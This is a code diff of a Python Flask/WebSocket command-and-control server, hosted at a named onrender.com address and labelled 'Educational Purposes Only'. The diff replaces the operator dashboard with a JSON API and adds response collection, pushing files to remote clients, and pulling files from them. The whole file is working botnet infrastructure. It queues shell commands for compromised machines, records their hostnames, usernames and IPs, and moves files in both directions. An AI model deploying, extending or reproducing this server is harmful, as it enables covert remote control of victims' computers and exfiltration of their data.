@@ -1,260 +1,71 @@
 #!/usr/bin/env python3
 """
-ENHANCED C2 SERVER - FLASK + WEBSOCKET
-Works on Render: https://c2-server-zz0i.onrender.com
+ENHANCED C2 SERVER - REAL-TIME RESPONSES & FILE SUPPORT
+Works on: https://c2-server-zz0i.onrender.com
 Educational Purposes Only
 """
 
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, send_file
 from flask_socketio import SocketIO, emit, join_room, leave_room
 import hashlib
 import time
 import threading
 import os
 import json
+import base64
 from datetime import datetime
 from collections import defaultdict
 import logging
+import tempfile
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'c2-secret-key-change-this-in-production-12345'
-socketio = SocketIO(app, cors_allowed_origins="*", logger=False, engineio_logger=False)
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'c2-secret-key-change-this-in-production-12345')
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max file size
+app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
+
+# Create upload folder if not exists
+os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+
+# Use gevent for Python 3.13 compatibility
+socketio = SocketIO(
+    app, 
+    cors_allowed_origins="*", 
+    logger=False, 
+    engineio_logger=False,
+    async_mode='gevent'
+)
 
 # Data storage
 clients = {}  # client_id -> client_data
 command_queue = defaultdict(list)  # client_id -> [commands]
+command_responses = defaultdict(list)  # client_id -> [responses]
 client_lock = threading.Lock()
 online_sockets = {}  # client_id -> socket_id
 
-# HTML dashboard
-HTML_DASHBOARD = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>C2 Server Dashboard</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; background: rgba(255, 255, 255, 0.95); border-radius: 15px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #2d3748 0%, #4a5568 100%); color: white; padding: 25px 30px; text-align: center; border-bottom: 3px solid #4299e1; }
-        .header h1 { font-size: 28px; margin-bottom: 10px; }
-        .header p { opacity: 0.8; font-size: 14px; }
-        .content { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 30px; }
-        @media (max-width: 768px) { .content { grid-template-columns: 1fr; } }
-        .panel { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
-        .panel h2 { color: #2d3748; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #4299e1; }
-        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }
-        .stat-box { background: #f7fafc; border-radius: 8px; padding: 15px; text-align: center; border: 1px solid #e2e8f0; }
-        .stat-number { font-size: 32px; font-weight: bold; color: #4299e1; display: block; }
-        .stat-label { font-size: 14px; color: #718096; margin-top: 5px; }
-        .client-item { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 15px; margin-bottom: 10px; transition: all 0.3s; }
-        .client-item:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-color: #4299e1; }
-        .client-item.online { border-left: 4px solid #48bb78; }
-        .client-item.offline { border-left: 4px solid #f56565; opacity: 0.7; }
-        .client-id { font-family: 'Courier New', monospace; font-weight: bold; color: #2d3748; }
-        .client-info { font-size: 14px; color: #4a5568; margin-top: 8px; }
-        .endpoint { background: #edf2f7; padding: 10px; border-radius: 6px; margin: 10px 0; font-family: 'Courier New', monospace; font-size: 14px; }
-        .status-online { color: #48bb78; font-weight: bold; }
-        .status-offline { color: #f56565; font-weight: bold; }
-        .btn { background: #4299e1; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: background 0.3s; }
-        .btn:hover { background: #3182ce; }
-        .form-group { margin: 15px 0; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #4a5568; }
-        .form-group input, .form-group textarea { width: 100%; padding: 10px; border: 2px solid #e2e8f0; border-radius: 6px; font-size: 14px; }
-        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #4299e1; }
-        .logs { background: #1a202c; color: #cbd5e0; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; }
-    </style>
-    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🛰️ C2 Command & Control Server</h1>
-            <p>Educational Purposes Only | Server: c2-server-zz0i.onrender.com</p>
-        </div>
-        
-        <div class="content">
-            <div class="panel">
-                <h2>📊 Server Statistics</h2>
-                <div class="stats-grid">
-                    <div class="stat-box">
-                        <span class="stat-number" id="totalClients">0</span>
-                        <span class="stat-label">Total Clients</span>
-                    </div>
-                    <div class="stat-box">
-                        <span class="stat-number" id="onlineClients">0</span>
-                        <span class="stat-label">Online Now</span>
-                    </div>
-                    <div class="stat-box">
-                        <span class="stat-number" id="queuedCommands">0</span>
-                        <span class="stat-label">Queued Commands</span>
-                    </div>
-                    <div class="stat-box">
-                        <span class="stat-number" id="serverUptime">0s</span>
-                        <span class="stat-label">Uptime</span>
-                    </div>
-                </div>
-                
-                <h2>🔗 Connection Endpoints</h2>
-                <div class="endpoint">WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/</div>
-                <div class="endpoint">API: https://c2-server-zz0i.onrender.com/command</div>
-                <div class="endpoint">Health: https://c2-server-zz0i.onrender.com/health</div>
-                
-                <h2>📝 Send Command</h2>
-                <div class="form-group">
-                    <label for="clientId">Client ID:</label>
-                    <input type="text" id="clientId" placeholder="Enter client ID">
-                </div>
-                <div class="form-group">
-                    <label for="command">Command:</label>
-                    <input type="text" id="command" placeholder="Enter command (e.g., whoami)">
-                </div>
-                <button class="btn" onclick="sendCommand()">🚀 Send Command</button>
-            </div>
-            
-            <div class="panel">
-                <h2>🖥️ Connected Clients</h2>
-                <div id="clientList">
-                    <p style="text-align: center; color: #a0aec0; padding: 40px;">No clients connected yet</p>
-                </div>
-                
-                <h2>📋 Server Logs</h2>
-                <div class="logs" id="serverLogs">
-[System] Server initialized
-[System] Waiting for client connections...
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        const socket = io();
-        let startTime = Date.now();
-        
-        // Update uptime
-        setInterval(() => {
-            const uptime = Math.floor((Date.now() - startTime) / 1000);
-            document.getElementById('serverUptime').textContent = uptime + 's';
-        }, 1000);
-        
-        // Socket events
-        socket.on('connect', () => {
-            addLog('[WebSocket] Connected to server');
-        });
-        
-        socket.on('client_connected', (data) => {
-            addLog(`[Client] ${data.client_id} connected - ${data.hostname}`);
-            updateClientList();
-        });
-        
-        socket.on('client_disconnected', (data) => {
-            addLog(`[Client] ${data.client_id} disconnected`);
-            updateClientList();
-        });
-        
-        socket.on('command_executed', (data) => {
-            addLog(`[Command] ${data.client_id}: ${data.command}`);
-        });
-        
-        // Update client list
-        function updateClientList() {
-            fetch('/clients')
-                .then(r => r.json())
-                .then(clients => {
-                    const clientList = document.getElementById('clientList');
-                    if (clients.length === 0) {
-                        clientList.innerHTML = '<p style="text-align: center; color: #a0aec0; padding: 40px;">No clients connected yet</p>';
-                        return;
-                    }
-                    
-                    let html = '';
-                    clients.forEach(client => {
-                        const statusClass = client.online ? 'online' : 'offline';
-                        const statusText = client.online ? '🟢 ONLINE' : '🔴 OFFLINE';
-                        const statusColor = client.online ? 'status-online' : 'status-offline';
-                        
-                        html += `
-                            <div class="client-item ${statusClass}">
-                                <div class="client-id">${client.id}</div>
-                                <div class="client-info">
-                                    <strong>${client.hostname}</strong> | ${client.os}<br>
-                                    User: ${client.username} | IP: ${client.ip}<br>
-                                    Status: <span class="${statusColor}">${statusText}</span><br>
-                                    Last seen: ${formatTime(client.last_seen)}
-                                </div>
-                            </div>
-                        `;
-                    });
-                    
-                    clientList.innerHTML = html;
-                    
-                    // Update stats
-                    document.getElementById('totalClients').textContent = clients.length;
-                    document.getElementById('onlineClients').textContent = clients.filter(c => c.online).length;
-                    document.getElementById('queuedCommands').textContent = clients.reduce((sum, c) => sum + c.commands_pending, 0);
-                });
-        }
-        
-        // Send command
-        function sendCommand() {
-            const clientId = document.getElementById('clientId').value;
-            const command = document.getElementById('command').value;
-            
-            if (!clientId || !command) {
-                alert('Please enter both client ID and command');
-                return;
-            }
-            
-            fetch('/command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({client_id: clientId, command: command})
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.status === 'queued') {
-                    addLog(`[Command] Queued for ${clientId}: ${command}`);
-                    document.getElementById('command').value = '';
-                    updateClientList();
-                } else {
-                    addLog(`[Error] ${data.error}`);
-                }
-            });
-        }
-        
-        // Add log
-        function addLog(message) {
-            const logs = document.getElementById('serverLogs');
-            const time = new Date().toLocaleTimeString();
-            logs.innerHTML = `[${time}] ${message}\n${logs.innerHTML}`;
-        }
-        
-        // Format time
-        function formatTime(timestamp) {
-            return new Date(timestamp * 1000).toLocaleTimeString();
-        }
-        
-        // Initial load
-        updateClientList();
-        setInterval(updateClientList, 5000);
-    </script>
-</body>
-</html>
-"""
-
 @app.route('/')
 def index():
-    """Serve dashboard"""
-    return render_template_string(HTML_DASHBOARD)
+    """Root endpoint"""
+    return jsonify({
+        'status': 'online',
+        'server': 'c2-server-zz0i.onrender.com',
+        'endpoints': {
+            '/health': 'Server health check',
+            '/clients': 'List connected clients',
+            '/command': 'Send command to client (POST)',
+            '/upload': 'Upload file to client (POST)',
+            '/download/<client_id>/<filename>': 'Download file from client (GET)',
+            '/socket.io/': 'WebSocket endpoint for clients'
+        },
+        'message': 'Educational Purposes Only'
+    })
 
 @app.route('/health')
 def health():
-    """Health check endpoint for Render"""
+    """Health check endpoint"""
     with client_lock:
         online = sum(1 for c in clients.values() if c.get('online', False))
         return jsonify({
@@ -285,6 +96,12 @@ def get_clients():
             })
         return jsonify(clients_list)
 
+@app.route('/responses/<client_id>')
+def get_responses(client_id):
+    """Get command responses for a client"""
+    with client_lock:
+        return jsonify(command_responses.get(client_id, []))
+
 @app.route('/command', methods=['POST'])
 def send_command():
     """Send command to client"""
@@ -292,6 +109,7 @@ def send_command():
         data = request.get_json()
         client_id = data.get('client_id')
         command = data.get('command')
+        wait_response = data.get('wait_response', False)
         
         if not client_id:
             return jsonify({'error': 'Missing client_id'}), 400
@@ -305,7 +123,8 @@ def send_command():
                 'id': cmd_id,
                 'command': command,
                 'timestamp': time.time(),
-                'status': 'pending'
+                'status': 'pending',
+                'wait_response': wait_response
             }
             
             # Add to queue
@@ -315,18 +134,131 @@ def send_command():
             if client_id in online_sockets:
                 socketio.emit('command', command_data, room=online_sockets[client_id])
                 logger.info(f"Command sent immediately to {client_id}: {command[:50]}...")
+                return jsonify({
+                    'status': 'sent',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'message': 'Command sent to online client'
+                })
             else:
                 logger.info(f"Command queued for offline client {client_id}: {command[:50]}...")
-            
-            return jsonify({
-                'status': 'queued',
-                'command_id': cmd_id,
-                'client_id': client_id
-            })
+                return jsonify({
+                    'status': 'queued',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'message': 'Command queued for offline client'
+                })
             
     except Exception as e:
         logger.error(f"Command error: {e}")
         return jsonify({'error': str(e)}), 400
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    """Upload file to send to client"""
+    try:
+        client_id = request.form.get('client_id')
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file provided'}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'error': 'No file selected'}), 400
+        
+        # Save file temporarily
+        filename = f"upload_{int(time.time())}_{file.filename}"
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(filepath)
+        
+        # Read file as base64
+        with open(filepath, 'rb') as f:
+            file_data = base64.b64encode(f.read()).decode('utf-8')
+        
+        # Create upload command
+        cmd_id = f"upload_{int(time.time())}"
+        command_data = {
+            'id': cmd_id,
+            'type': 'upload',
+            'filename': file.filename,
+            'filedata': file_data,
+            'timestamp': time.time(),
+            'status': 'pending'
+        }
+        
+        with client_lock:
+            # Add to queue
+            command_queue[client_id].append(command_data)
+            
+            # If client is online, notify via WebSocket
+            if client_id in online_sockets:
+                socketio.emit('command', command_data, room=online_sockets[client_id])
+                return jsonify({
+                    'status': 'sent',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'filename': file.filename,
+                    'message': 'File sent to client'
+                })
+            else:
+                return jsonify({
+                    'status': 'queued',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'filename': file.filename,
+                    'message': 'File queued for offline client'
+                })
+            
+    except Exception as e:
+        logger.error(f"Upload error: {e}")
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/download/<client_id>/<filename>')
+def download_file(client_id, filename):
+    """Request file download from client"""
+    try:
+        # Create download command
+        cmd_id = f"download_{int(time.time())}"
+        command_data = {
+            'id': cmd_id,
+            'type': 'download',
+            'filename': filename,
+            'timestamp': time.time(),
+            'status': 'pending'
+        }
+        
+        with client_lock:
+            # Add to queue
+            command_queue[client_id].append(command_data)
+            
+            # If client is online, notify via WebSocket
+            if client_id in online_sockets:
+                socketio.emit('command', command_data, room=online_sockets[client_id])
+                return jsonify({
+                    'status': 'sent',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'filename': filename,
+                    'message': 'Download request sent to client'
+                })
+            else:
+                return jsonify({
+                    'status': 'queued',
+                    'command_id': cmd_id,
+                    'client_id': client_id,
+                    'filename': filename,
+                    'message': 'Download request queued'
+                })
+            
+    except Exception as e:
+        logger.error(f"Download error: {e}")
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/file/<file_id>')
+def get_file(file_id):
+    """Retrieve downloaded file"""
+    # In a real implementation, you'd retrieve from storage
+    # For now, return a placeholder
+    return jsonify({'status': 'File endpoint', 'file_id': file_id})
 
 @socketio.on('connect')
 def handle_connect():
@@ -345,7 +277,6 @@ def handle_disconnect():
                     clients[client_id]['last_seen'] = time.time()
                 del online_sockets[client_id]
                 logger.info(f"Client disconnected: {client_id}")
-                socketio.emit('client_disconnected', {'client_id': client_id})
                 break
 
 @socketio.on('register')
@@ -396,12 +327,6 @@ def handle_register(data):
                 'timestamp': time.time()
             })
             
-            # Notify dashboard
-            socketio.emit('client_connected', {
-                'client_id': client_id,
-                'hostname': data.get('hostname', 'Unknown')
-            })
-            
             # Send any queued commands
             if client_id in command_queue and command_queue[client_id]:
                 for cmd in command_queue[client_id]:
@@ -424,30 +349,81 @@ def handle_heartbeat(data):
 
 @socketio.on('command_response')
 def handle_command_response(data):
-    """Handle command response from client"""
+    """Handle command response from client - REAL TIME"""
     client_id = data.get('client_id')
     command_id = data.get('command_id')
     output = data.get('output', '')
+    success = data.get('success', True)
     
     logger.info(f"Command response from {client_id}: {command_id}")
     
-    # Limit log output
-    if len(output) > 100:
-        logger.info(f"Output (first 100 chars): {output[:100]}...")
-    else:
-        logger.info(f"Output: {output}")
+    # Store response
+    with client_lock:
+        if client_id not in command_responses:
+            command_responses[client_id] = []
+        
+        response_data = {
+            'command_id': command_id,
+            'client_id': client_id,
+            'output': output,
+            'success': success,
+            'timestamp': time.time(),
+            'received_at': datetime.now().isoformat()
+        }
+        
+        command_responses[client_id].append(response_data)
+        
+        # Keep only last 50 responses
+        if len(command_responses[client_id]) > 50:
+            command_responses[client_id] = command_responses[client_id][-50:]
     
-    # Notify dashboard
-    socketio.emit('command_executed', {
+    # Broadcast to any console listening for this client
+    emit('response_received', response_data, room=f"console_{client_id}")
+    
+    # Also emit to general console room
+    emit('new_response', {
         'client_id': client_id,
         'command_id': command_id,
-        'output_preview': output[:100] + ('...' if len(output) > 100 else '')
-    })
+        'output_preview': output[:100] + ('...' if len(output) > 100 else ''),
+        'timestamp': time.time()
+    }, room='consoles')
+
+@socketio.on('file_response')
+def handle_file_response(data):
+    """Handle file response from client"""
+    client_id = data.get('client_id')
+    filename = data.get('filename')
+    filedata = data.get('filedata')  # base64 encoded
+    success = data.get('success', True)
+    
+    logger.info(f"File response from {client_id}: {filename}")
+    
+    # Store file (in production, use proper storage)
+    if success and filedata:
+        file_id = f"file_{int(time.time())}_{hashlib.md5(filename.encode()).hexdigest()[:6]}"
+        # In real implementation, save to storage
+        
+        emit('file_received', {
+            'client_id': client_id,
+            'filename': filename,
+            'file_id': file_id,
+            'success': success,
+            'timestamp': time.time()
+        }, room=f"console_{client_id}")
+
+@socketio.on('console_connect')
+def handle_console_connect(data):
+    """Console connects to listen for responses"""
+    client_id = data.get('client_id')
+    if client_id:
+        join_room(f"console_{client_id}")
+        join_room('consoles')
+        logger.info(f"Console connected for client {client_id}")
 
 def cleanup_stale_clients():
     """Periodically cleanup stale clients"""
     while True:
-        time.sleep(60)  # Every minute
+        time.sleep(60)
         
         with client_lock:
             current_time = time.time()
@@ -471,15 +447,15 @@ def print_banner():
     """Print server banner"""
     print("""
     ╔══════════════════════════════════════════════════╗
-    ║           ENHANCED C2 SERVER                     ║
+    ║           REAL-TIME C2 SERVER                    ║
     ║      https://c2-server-zz0i.onrender.com          ║
     ║        Educational Purposes Only                 ║
-    ╚══════════════════════════════════════════════════╝
+    ╚════════════════════════════━━━━━━━━━━━━━━━━━━━━━━╝
     """)
     print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
     print("[*] WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/")
-    print("[*] Dashboard: https://c2-server-zz0i.onrender.com")
-    print("[*] API: https://c2-server-zz0i.onrender.com/command")
+    print("[*] Real-time responses enabled")
+    print("[*] File upload/download support")
     print("[*] Press Ctrl+C to stop\n")
 
 if __name__ == '__main__':
@@ -491,10 +467,21 @@ if __name__ == '__main__':
     
     # Run server
     port = int(os.environ.get('PORT', 10000))
-    socketio.run(
+    
+    # Use gevent server
+    from gevent import pywsgi
+    from geventwebsocket.handler import WebSocketHandler
+    
+    logger.info(f"Starting server on 0.0.0.0:{port}")
+    
+    server = pywsgi.WSGIServer(
+        ('0.0.0.0', port),
         app,
-        host='0.0.0.0',
-        port=port,
-        debug=False,
-        allow_unsafe_werkzeug=True
+        handler_class=WebSocketHandler
     )
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        logger.info("Server shutting down...")
+        server.stop()
